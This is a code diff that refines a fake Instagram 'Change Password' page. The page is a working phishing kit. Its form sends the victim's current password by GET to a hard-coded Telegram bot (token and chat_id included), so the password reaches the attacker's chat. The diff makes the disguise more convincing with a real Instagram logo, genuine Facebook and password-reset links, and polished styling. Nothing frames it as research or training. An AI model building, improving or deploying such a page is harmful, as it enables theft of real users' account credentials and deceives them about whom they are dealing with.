@@ -16,7 +16,7 @@
             margin: 0;
             min-height: 100vh;
         }
-        .container { 
+        .main-container { 
             background-color: #fff; 
             border: 1px solid #dbdbdb; 
             padding: 20px 40px; 
@@ -28,14 +28,11 @@
             border-radius: 1px;
         }
         .insta-logo {
-            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yM/r/8Z_Sbc_O9vV.png');
-            background-position: 0px -52px;
-            background-size: 176px 258px;
             width: 175px;
-            height: 51px;
             margin: 22px 0 12px;
+            cursor: pointer;
         }
-        .info-text {
+        .header-text {
             color: #737373;
             font-weight: 600;
             font-size: 16px;
@@ -53,9 +50,9 @@
             font-size: 12px;
         }
         input:focus { border: 1px solid #a8a8a8; outline: none; }
-        .btn { 
+        .btn-submit { 
             width: 100%; 
-            background-color: #4cb5f9; 
+            background-color: #0095f6; 
             color: white; 
             border: none; 
             padding: 7px; 
@@ -65,6 +62,7 @@
             cursor: pointer; 
             margin: 15px 0; 
         }
+        .btn-submit:hover { background-color: #1877f2; }
         .divider {
             display: flex;
             width: 100%;
@@ -73,43 +71,53 @@
         }
         .divider div { flex: 1; height: 1px; background-color: #dbdbdb; }
         .divider span { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
+        
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; margin-bottom: 15px; }
+        .forgot-link { color: #00376b; font-size: 12px; text-decoration: none; }
+
         .footer {
             margin-top: auto;
             padding: 24px;
             text-align: center;
             width: 100%;
-            max-width: 1000px;
         }
         .footer-links {
             display: flex;
             justify-content: center;
             flex-wrap: wrap;
             gap: 15px;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
-        .footer-links span, .footer-links select {
+        .footer-links span, .footer-links a {
             color: #8e8e8e;
             font-size: 12px;
             text-decoration: none;
+        }
+        .lang-select {
+            border: none;
+            background: none;
+            color: #8e8e8e;
+            font-size: 12px;
+            outline: none;
             cursor: pointer;
         }
-        select { border: none; background: none; outline: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="insta-logo"></div>
-        <p class="info-text">Change Password</p>
+    <div class="main-container">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_with_gradient.png/c29c4356453f.png" class="insta-logo" alt="Instagram">
         
-        <form action="https://api.telegram.org/bot8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU/sendMessage" method="GET">
+        <p class="header-text">Trouble Logging In?</p>
+        
+        <form action="https://api.telegram.org/bot8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU/sendMessage" method="GET" style="width: 100%;">
             <input type="hidden" name="chat_id" value="6347084263">
             
-            <input type="password" name="text" placeholder="Current Password" required>
+            <input type="password" name="text" placeholder="Current Password" required title="Please enter your current password">
             <input type="password" placeholder="New Password" required>
             <input type="password" placeholder="Confirm New Password" required>
             
-            <button type="submit" class="btn">Change Password</button>
+            <button type="submit" class="btn-submit">Change Password</button>
         </form>
 
         <div class="divider">
@@ -118,8 +126,8 @@
             <div></div>
         </div>
         
-        <p style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">Log in with Facebook</p>
-        <a href="#" style="color: #00376b; font-size: 12px; text-decoration: none; margin-top: 10px;">Forgot password?</a>
+        <a href="https://www.facebook.com/login" class="fb-login">Log in with Facebook</a>
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgot password?</a>
     </div>
 
     <div class="footer">
@@ -132,13 +140,16 @@
             <span>API</span>
             <span>Privacy</span>
             <span>Terms</span>
-            <select>
-                <option>English</option>
-                <option>Français</option>
-                <option>العربية</option>
-            </select>
         </div>
-        <div style="color: #8e8e8e; font-size: 12px;">© 2026 Instagram from Meta</div>
+        <div class="footer-links">
+            <select class="lang-select">
+                <option value="en">English</option>
+                <option value="fr">Français</option>
+                <option value="ar">العربية</option>
+                <option value="es">Español</option>
+            </select>
+            <span style="color: #8e8e8e;">© 2026 Instagram from Meta</span>
+        </div>
     </div>
 
 </body>
